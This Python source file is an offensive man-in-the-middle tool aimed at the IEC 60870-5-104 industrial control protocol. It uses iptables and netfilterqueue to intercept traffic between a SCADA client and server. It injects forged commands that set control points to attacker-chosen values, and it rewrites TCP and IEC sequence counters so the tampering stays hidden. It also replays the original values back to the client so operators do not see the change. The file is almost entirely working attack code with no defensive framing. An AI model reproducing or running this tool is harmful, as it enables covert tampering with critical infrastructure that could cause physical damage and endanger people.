import netfilterqueue
import typer
from netfilterqueue import NetfilterQueue
from kamene.layers.inet import *
from kamene.all import *
import warnings
import threading
from utils.utils import *

warnings.simplefilter("ignore")


class IEC104MITM:
    def __init__(self, client_ip: str, server_ip: str, server_port: int):
        self.client_ip = client_ip
        self.server_ip = server_ip
        self.server_port = server_port
        self.client_port = None

        self.injected_packet_sent = False
        self.original_ioa_values = {}
        self.faked_ioa_values = {}

        self.tcp_offset = 0
        self.iec_offset = 0

        self.client_tcp_seq_next, self.client_tcp_ack, self.client_iec_tx, self.client_iec_rx = None, None, None, None

    def extract_tcp_and_iec_values(self, packet: IP) -> (int, int, int, int, int):
        tcp_seq, tcp_seq_next, tcp_ack = extract_tcp_details(packet)
        iec_tx, iec_rx = None, None
        if extract_iec_details(packet) is not None:
            iec_tx, iec_rx = extract_iec_details(packet)
        if packet['IP'].src == self.client_ip:
            self.client_port = packet['TCP'].sport
            self.client_tcp_seq_next = tcp_seq_next
            self.client_tcp_ack = tcp_ack
            if iec_tx is not None and iec_rx is not None:
                self.client_iec_tx = iec_tx
                self.client_iec_rx = iec_rx

            if extract_ioa_values(packet) is not None:
                ioa, value = extract_ioa_values(packet)
                self.original_ioa_values[ioa] = value
        return tcp_seq, tcp_ack, iec_tx, iec_rx

    def update_and_send(self, packet: IP, tcp_seq: int, tcp_ack: int, iec_tx: int, iec_rx: int):
        if packet['IP'].src == self.client_ip:
            tcp_seq, tcp_ack = tcp_seq + self.tcp_offset, tcp_ack + self.tcp_offset
            if iec_tx is not None and iec_rx is not None:
                iec_tx, iec_rx = iec_tx + self.iec_offset, iec_rx + self.iec_offset
        elif packet['IP'].src == self.server_ip:
            tcp_seq, tcp_ack = tcp_seq - self.tcp_offset, tcp_ack - self.tcp_offset
            if iec_tx is not None and iec_rx is not None:
                iec_tx, iec_rx = iec_tx - self.iec_offset, iec_rx - self.iec_offset

        packet = update_tcp_header(packet, tcp_seq, tcp_ack)

        if iec_tx is not None and iec_rx is not None:
            packet = update_iec_apci(packet, iec_tx, iec_rx)
        if packet['IP'].src == self.server_ip:
            packet = update_iec_asdu(packet, self.original_ioa_values)
        elif packet['IP'].src == self.client_ip:
            packet = update_iec_asdu(packet, self.faked_ioa_values)

        packet = update_checksums(packet)
        send(packet, verbose=False)

    def packet_handler(self, packet: netfilterqueue.Packet) -> None:
        smart_packet = IP(packet.get_payload())
        if smart_packet['IP'].src in [self.client_ip, self.server_ip] and \
                smart_packet['IP'].dst in [self.client_ip, self.server_ip] and \
                self.server_port in [smart_packet['TCP'].sport, smart_packet['TCP'].dport]:
            if self.injected_packet_sent:
                self.injected_packet_sent = False
                self.forge_ack()
            else:
                tcp_seq, tcp_ack, iec_tx, iec_rx = self.extract_tcp_and_iec_values(smart_packet)
                self.update_and_send(smart_packet, tcp_seq, tcp_ack, iec_tx, iec_rx)
            packet.drop()
        else:
            packet.accept()

    def inject_packet(self, ioa, value):
        if None in [self.client_tcp_seq_next, self.client_tcp_ack, self.client_iec_rx, self.client_iec_tx]:
            typer.secho("[-] Some values are still None, try again later!", fg=typer.colors.RED)
            return

        self.iec_offset += 1
        tx = self.client_iec_tx + self.iec_offset
        rx = self.client_iec_rx + self.iec_offset
        payload = build_iec_packet(tx, rx, ioa, value)

        ip = IP(src=self.client_ip, dst=self.server_ip)
        tcp = TCP(dport=self.server_port, sport=self.client_port)
        tcp.seq = self.client_tcp_seq_next + self.tcp_offset
        tcp.ack = self.client_tcp_ack
        tcp.payload = payload
        tcp.flags = 24
        tcp.window = 502
        packet = ip / tcp
        update_checksums(packet)

        self.tcp_offset += len(payload)
        self.faked_ioa_values[ioa] = value
        self.injected_packet_sent = True
        send(packet, verbose=False)

    def forge_ack(self):
        ip = IP(src=self.client_ip, dst=self.server_ip)
        tcp = TCP(dport=self.server_port, sport=self.client_port)
        tcp.seq = self.client_tcp_seq_next + self.tcp_offset
        tcp.ack = self.client_tcp_ack + self.tcp_offset
        tcp.flags = 16
        tcp.window = 502
        packet = ip / tcp
        update_checksums(packet)
        send(packet, verbose=False)

    def read_command(self):
        while True:
            try:
                command = input("Command: ")
                if command.split(":") != 2:
                    ioa = int(command.split(":")[0])
                    value = int(command.split(":")[1])
                    self.inject_packet(ioa, value)
            except ValueError:
                pass

    def start(self, queue_id=1):
        net_filter_queue = NetfilterQueue()
        net_filter_queue.bind(queue_id, self.packet_handler)
        try:
            net_filter_queue.run()
        except KeyboardInterrupt:
            print('')

        net_filter_queue.unbind()


def main(
        client_ip: str = typer.Argument(..., help="IP address of the IEC client"),
        server_ip: str = typer.Argument(..., help="IP address of the IEC server"),
        server_port: int = typer.Option(2404, help="TCP port number of the IEC server.")
):
    if not is_ipv4_address(data=client_ip) or not is_ipv4_address(data=server_ip):
        typer.secho("[-] Invalid client/server IP provided.", fg=typer.colors.RED)
        exit(1)
    if not is_tcp_port(data=server_port):
        typer.secho("[-] Invalid server port provided.", fg=typer.colors.RED)
        exit(1)
    try:
        typer.secho("[*] Trying to setup iptables rules.", fg=typer.colors.YELLOW)
        setup_iptables(client_ip=client_ip, server_ip=server_ip, server_port=server_port)
        typer.secho("[+] Rules added!", fg=typer.colors.GREEN)
    except:
        typer.secho("[-] Something went wrong during rule manipulation!.", fg=typer.colors.RED)
        exit(1)

    mitm = IEC104MITM(client_ip, server_ip, server_port)
    thread1 = threading.Thread(target=mitm.start)
    thread1.daemon = True
    thread1.start()
    mitm.read_command()


if __name__ == "__main__":
    typer.run(main)
